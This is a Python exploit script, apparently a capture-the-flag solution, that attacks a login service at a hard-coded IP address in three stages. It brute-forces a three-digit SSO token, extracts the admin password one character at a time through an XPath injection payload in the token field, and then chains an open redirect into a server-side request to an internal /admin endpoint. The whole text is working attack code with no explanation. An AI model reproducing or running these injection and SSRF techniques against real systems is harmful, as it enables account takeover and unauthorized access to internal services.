import requests
import subprocess
#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
port ="1337"
base = f"http://85.214.190.217:{port}"
url = f"{base}/login"
data = {'username':'alice','password':'secret1','sso_token':'000'}
sso_token =""
# 1) SSO Token bruteforcing
def sso_token_extraction():
    for i in range(1000):
        data = {'username':'alice','password':'secret1','sso_token':str("{:0>3d}".format(i))}
        result = requests.post(url,data=data)
        if result.status_code == 200:
            sso_token = str(i)
            return str(sso_token)
        
sso_token=sso_token_extraction()
print(sso_token)

# 2) Password Exfiltration
def password_extractor():
    password = ""
    rev = False
    for i in range(50): # 50 is random since string-length is filtered
        found = False
        #print("password" + password)
        for char in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ':
            # if the password length is less than 6, it will append the found char in the left side ( reversed ) otherwise it will append it normally
            if not rev:
                s = password + char
            else :
                s = char + password
            data = {'username': 'alice', 'password': 'secret1', 'sso_token': sso_token + '\' and contains(//user[username=\'admin\']/password,"{s}") and 1=\'1'.format(s=s)}
            result = requests.post(url, data=data)
            if result.status_code == 200 :
                password = s
                found = True
                break
        if not found:
            if len(password) < 6: 
                rev = True
                continue
            break
    return password

password =password_extractor()

print(password)

def make_request():
    final = f'{base}/status-check?debug=true&url={base}/redirect?url=http://127.0.0.1:{port}/admin%26s=308'
    payload = {'key': password}
    response = requests.get(final, data=payload)
    return response.content

print(make_request())

